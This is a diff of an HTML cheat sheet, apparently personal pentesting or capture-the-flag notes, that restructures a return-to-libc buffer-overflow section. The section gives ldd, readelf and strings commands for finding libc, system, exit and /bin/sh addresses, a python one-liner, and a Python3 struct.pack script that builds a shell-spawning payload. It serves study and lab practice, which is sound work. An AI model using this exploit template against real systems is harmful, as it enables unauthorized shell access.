@@ -109,64 +109,10 @@ layout: default
                         <td>NX</td>
                         <td>
                             <li>Enabled = Cannot run from the stack</li>
-                            <li>Use return to libc method:</li>
+                            <li>Use return to libc method</li>
                             <ul>
                                 <li>Overwrite return address so the computer jumps to the desired function.  Typically the system function with the argument /bin/sh</li>
                                 <li>https://0xdf.gitlab.io/2019/03/23/htb-frolic.html</li>
-                                <li>Methodology</li>
-                                <table>
-                                    <tr>
-                                        <td>Get base libc address</td>
-                                        <td>
-                                            <li>ldd &lt;BOFable Program&gt;</li>
-                                            <ul>
-                                                <li>Output: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (<span class="purple">0xb7e19000</span>)</li>
-                                            </ul>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>Get address for System function</td>
-                                        <td>
-                                            <li><span class="red">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; system@&quot;</span></li>
-                                            <ul>
-                                                <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="red">0x&lt;readelf hex address&gt;</span></li>
-                                            </ul>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>Get address for Exit function</td>
-                                        <td>
-                                            <li><span class="teal">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit@&quot;</span></li>
-                                            <ul>
-                                                <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="teal">0x&lt;readelf hex address&gt;</span></li>
-                                            </ul>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>Get hex address for "/bin/sh"</td>
-                                        <td>
-                                            <li><span class="brown">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span></li>
-                                            <ul>
-                                                <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="brown">0x&lt;Strings -a -t x hex address&gt;</span></li>
-                                            </ul>
-                                        </td>
-                                    </tr>
-                                    <tr>
-                                        <td>Assemble final BOF command/input</td>
-                                        <td>
-                                            <li>$(python -c &apos;print(&quot;a&quot;*&lt;offset&gt; + &quot;<span class="red">&lt;System&gt;</span>&quot; + &quot;<span class="teal">&lt;Exit&gt;</span>&quot; + &quot;<span class="brown">&lt;/bin/sh&gt;</span>&quot;)&apos;)</li>
-                                            <ul>
-                                                <li>Find offset by sending pattern to trigger BOF and find where in the pattern the pointer instruction lands</li>
-                                                <li>Addresses must be little-endian encoded</li>
-                                                <ul>
-                                                    <li>0xb7e53da0 = \xa0\x3d\xe5\xb7</li>
-                                                </ul>
-                                            </ul>
-                                            <li>Python3 script to assemble BOF command/input</li>
-                                            <pre>#! /usr/bin/env python3&#13;&#10;&#13;&#10;import struct&#13;&#10;import sys&#13;&#10;&#13;&#10;&#13;&#10;libc_base = <span class="purple">&lt;libc address&gt;</span>&#13;&#10;system = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="red">0x&lt;system@@ address&gt;</span>)&#13;&#10;exit = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="teal">0x&lt;exit@@ address&gt;</span>)&#13;&#10;binsh = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="brown">0x&lt;/bin/sh address&gt;</span>)&#13;&#10;&#13;&#10;path = b&quot;A&quot; * &lt;msf-patten_offset&gt; + system + exit + binsh&#13;&#10;sys.stdout.buffer.write(path)&#13;&#10;</pre>
-                                        </td>
-                                    </tr>
-                                </table>
                             </ul>
                         </td>
                     </tr>
@@ -181,7 +127,61 @@ layout: default
                 </table>
             </td>
         </tr>
-        <tr></tr>
+    </table>
+    
+    
+    <table>
+        <tr>
+            <td>Get base libc address</td>
+            <td>
+                <li>ldd &lt;BOFable Program&gt;</li>
+                <ul>
+                    <li>Output: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (<span class="purple">0xb7e19000</span>)</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get address for System function</td>
+            <td>
+                <li><span class="red">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; system@&quot;</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="red">0x&lt;readelf hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get address for Exit function</td>
+            <td>
+                <li><span class="teal">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit@&quot;</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="teal">0x&lt;readelf hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get hex address for "/bin/sh"</td>
+            <td>
+                <li><span class="brown">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="brown">0x&lt;Strings -a -t x hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Assemble final BOF command/input</td>
+            <td>
+                <li>$(python -c &apos;print(&quot;a&quot;*&lt;offset&gt; + &quot;<span class="red">&lt;System&gt;</span>&quot; + &quot;<span class="teal">&lt;Exit&gt;</span>&quot; + &quot;<span class="brown">&lt;/bin/sh&gt;</span>&quot;)&apos;)</li>
+                <ul>
+                    <li>Find offset by sending pattern to trigger BOF and find where in the pattern the pointer instruction lands</li>
+                    <li>Addresses must be little-endian encoded</li>
+                    <ul>
+                        <li>0xb7e53da0 = \xa0\x3d\xe5\xb7</li>
+                    </ul>
+                </ul>
+                <li>Python3 script to assemble BOF command/input</li>
+                <pre>#! /usr/bin/env python3&#13;&#10;&#13;&#10;import struct&#13;&#10;import sys&#13;&#10;&#13;&#10;&#13;&#10;libc_base = <span class="purple">&lt;libc address&gt;</span>&#13;&#10;system = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="red">0x&lt;system@@ address&gt;</span>)&#13;&#10;exit = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="teal">0x&lt;exit@@ address&gt;</span>)&#13;&#10;binsh = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="brown">0x&lt;/bin/sh address&gt;</span>)&#13;&#10;&#13;&#10;path = b&quot;A&quot; * &lt;msf-patten_offset&gt; + system + exit + binsh&#13;&#10;sys.stdout.buffer.write(path)&#13;&#10;</pre>
+            </td>
+        </tr>
     </table>
     
     
